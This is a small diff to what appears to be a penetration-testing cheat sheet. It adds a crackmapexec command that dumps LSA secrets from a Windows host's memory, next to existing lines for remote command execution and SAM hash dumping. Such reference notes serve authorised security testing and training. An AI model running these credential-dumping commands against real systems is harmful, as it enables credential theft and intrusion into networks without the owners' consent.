@@ -83,6 +83,8 @@ crackmapexec smb $ip -u Administrator -p 'P@ssw0rd' -X 'whoami'`
 
 ### Getting Credentials
 ```bash
+# We can read LSA password from memory with adminstrative access a box
+crackmapexec smb $ip -u 'Administrator' -p 'PASS' --lsa 
 # Dump local SAM hashes 
 crackmapexec smb $ip -u 'Administrator' -p 'PASS' --local-auth --sam
 
